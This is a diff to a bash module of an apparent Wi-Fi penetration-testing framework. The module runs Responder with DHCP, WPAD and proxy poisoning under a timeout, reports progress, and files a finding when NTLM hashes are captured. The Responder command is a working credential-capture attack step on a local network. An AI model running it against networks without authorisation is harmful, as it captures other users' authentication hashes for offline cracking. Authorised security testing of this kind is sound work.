@@ -30,6 +30,7 @@ C_RESET="${ASTRA_COLOR_RESET:-}"
 
 # Inputs from Environment
 INTERFACE="${WIFI_INTERFACE:-}"
+SCAN_TIME="${SCAN_TIME:-60}"
 SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
@@ -45,17 +46,63 @@ echo -e "${C_PROMPT}[*]${C_RESET} Starting Responder pivot on ${C_VAR}${INTERFAC
 
 LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_responder.log"
 
-# Responder creates its own logs in /usr/share/responder/logs or similar
-# We'll try to redirect stdout to our session evidence
-if command -v responder &>/dev/null; then
-    # -I: Interface, -d: DHCP, -w: WPAD, -P: Proxy
-    # We run in foreground but the Go orchestrator can spawn us in background
-    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        responder -I "$INTERFACE" -dwP 2>&1 | tee "$LOG_FILE"
-    else
-        responder -I "$INTERFACE" -dwP > "$LOG_FILE" 2>&1
-    fi
-else
+if ! command -v responder &>/dev/null; then
     echo "[!] responder tool not found."
     exit 1
 fi
+
+# 1. 🛰️ DYNAMIC TELEMETRY HEARTBEAT (Background)
+(
+    ELAPSED=0
+    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        PERCENT=$(( 20 + (ELAPSED * 70 / SCAN_TIME) ))
+        [[ $PERCENT -gt 90 ]] && PERCENT=90
+        STATUS="Responder active on ${INTERFACE}... ($(( SCAN_TIME - ELAPSED ))s left)"
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
+        sleep 5
+        ((ELAPSED+=5))
+    done
+) &
+TEL_PID=$!
+
+# 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # In Tactical Window: Run in foreground so it renders correctly
+    timeout "$SCAN_TIME" responder -I "$INTERFACE" -dwP || true
+else
+    # In Main Feed: Redirect to log to keep terminal clean
+    timeout "$SCAN_TIME" responder -I "$INTERFACE" -dwP > "$LOG_FILE" 2>&1 &
+    TOOL_PID=$!
+    wait $TOOL_PID || true
+fi
+
+kill "$TEL_PID" 2>/dev/null || true
+
+# 3. Final Signal & Reporting
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
+
+if grep -qiE "captured|Hash|NTLM" "$LOG_FILE" 2>/dev/null; then
+     "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "LLMNR/NBT-NS Hash Capture" \
+        --severity HIGH \
+        --desc "Captured authentication hashes via LLMNR/NBT-NS poisoning on $INTERFACE." \
+        --target "Local Clients" \
+        --evidence "$LOG_FILE" \
+        --rationale "Captured hashes can be cracked offline to recover cleartext credentials. This demonstrates susceptibility to local network name resolution poisoning."
+else
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "[G6] Audit Complete" \
+        --severity INFO \
+        --desc "Completed Responder pivot on $INTERFACE. No hashes were captured during the test window." \
+        --target "Local Clients" \
+        --evidence "$LOG_FILE" \
+        --rationale "Lack of captured hashes indicates that either clients are not using legacy name resolution protocols or they are otherwise mitigated (e.g., via GPO or LLMNR/NetBIOS disablement)."
+fi
+
+exit 0
